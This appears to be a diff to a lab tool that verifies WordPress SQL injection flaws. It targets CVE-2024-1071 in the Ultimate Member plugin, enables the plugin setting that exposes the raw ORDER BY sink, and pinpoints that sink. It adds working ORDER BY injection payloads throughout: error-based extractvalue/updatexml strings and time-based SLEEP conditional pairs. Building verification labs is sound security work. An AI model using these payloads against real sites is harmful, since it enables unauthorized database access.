@@ -289,7 +289,13 @@ def _finalize_lab(lab: "_Lab", boot: Optional["_LabSession"], res: WpVerifyResul
 # ver _auto_resolve_wp_blockers) cuyo valor es el hash del post real; `meta_key`, la meta que
 # hay que mantener sincronizada.
 _SQLI_CUSTOM_SORT_GATE = {
-    "ultimate-member": {"meta_key": "_um_sortby_custom", "directory_id_param": "directory_id"},
+    # ultimate-member was here but was WRONG: the actual injection is NOT in the sortby_custom
+    # branch (class-member-directory.php line 1464) where WP_Meta_Query properly escapes
+    # meta_key. The real CVE-2024-1071 sink is in Member_Directory_Meta::ajax_get_members()
+    # (class-member-directory-meta.php line 820): ORDER BY u.$sortby $order — raw string
+    # interpolation. That path is active only when member_directory_own_table=1, which the
+    # bootstrap now enables. Gate mechanism is not needed there; the injection fires
+    # unconditionally on any sorting value that falls to the else branch.
 }
 
 # Plugins where the vulnerable AJAX endpoint is unauthenticated: CVE is exploitable WITHOUT
@@ -1526,6 +1532,16 @@ def _bootstrap_lab(lab: "_Lab", plugin_source_dir: str, slug: str, step, res: Wp
             lab.wp_cli("user", "meta", "update", "1", "_um_status", "approved", timeout=10)
             lab.wp_cli("user", "meta", "update", "1", "account_status", "approved", timeout=10)
             step("admin (ID=1) marcado como UM-approved -- necesario para que ORDER BY se evalúe")
+            # Enable UM's own metadata table (member_directory_own_table=1). Without this,
+            # UM instantiates Member_Directory (uses WP_User_Query with validated orderby)
+            # instead of Member_Directory_Meta (uses raw SQL: ORDER BY u.$sortby $order).
+            # CVE-2024-1071 is in Member_Directory_Meta — the injection is at line 820 of
+            # class-member-directory-meta.php. This option is off by default; real sites
+            # enable it via the UM admin → Settings → Users → "Own Metadata Table" toggle.
+            lab.wp_cli("option", "patch", "insert", "um_options", "member_directory_own_table", "1",
+                       timeout=10)
+            step("member_directory_own_table=1 activado -- UM usara Member_Directory_Meta "
+                 "(raw SQL: ORDER BY u.$sortby $order) en lugar de WP_User_Query")
             # Verify that MySQL SUBSTRING(MD5(ID), 11, 5) can actually find the directory post
             # from its hash. get_directory_by_hash() relies on this exact SQL, so if it returns
             # nothing here the AJAX endpoint will always fail with "Wrong member directory data".
@@ -3277,7 +3293,14 @@ def verify_wordpress_sqli(
             # buscamos). Con la coma, la subconsulta es una expresion valida en el ORDER BY y
             # se evalua aunque la tabla este vacia -- el error XPATH se genera en tiempo de
             # evaluacion de la expresion, antes de que haya filas que ordenar.
+            # Two formats: (a) append-style for injections that go into 'ORDER BY existing_col,{val}'
+            # (b) replace-style for injections where the WHOLE value becomes 'ORDER BY u.{val}'
+            # e.g. UM CVE-2024-1071: ORDER BY u.$sortby — 'u.,$injection' is invalid MySQL;
+            # 'u.user_login,$injection' is valid (second item in ORDER BY list).
+            _orderby_col_prefix = "user_login,"
             orderby_error_payloads = [
+                f"{_orderby_col_prefix}(SELECT extractvalue(1,concat(0x7e,version())))",
+                f"{_orderby_col_prefix}(SELECT updatexml(1,concat(0x7e,version()),1))",
                 ",(SELECT extractvalue(1,concat(0x7e,version())))",
                 ",(SELECT updatexml(1,concat(0x7e,version()),1))",
             ]
@@ -3330,6 +3353,12 @@ def verify_wordpress_sqli(
                 # la que controla el retraso. El par incondicional (SLEEP(5) vs SLEEP(0)) sirve
                 # de ultimo recurso si la subconsulta CASE se evalua en contexto de fila vacia.
                 orderby_timing_pairs = [
+                    # replace-style: for ORDER BY u.{val} — 'u.user_login,subquery' is valid MySQL
+                    (f"{_orderby_col_prefix}(SELECT IF(1=1,SLEEP(5),0))",
+                     f"{_orderby_col_prefix}(SELECT IF(1=2,SLEEP(5),0))"),
+                    (f"{_orderby_col_prefix}(SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)",
+                     f"{_orderby_col_prefix}(SELECT CASE WHEN (1=2) THEN SLEEP(5) ELSE 0 END)"),
+                    # append-style: for ORDER BY existing_col,{val}
                     (",(SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)",
                      ",(SELECT CASE WHEN (1=2) THEN SLEEP(5) ELSE 0 END)"),
                     (",(SELECT SLEEP(5))", ",(SELECT SLEEP(0))"),
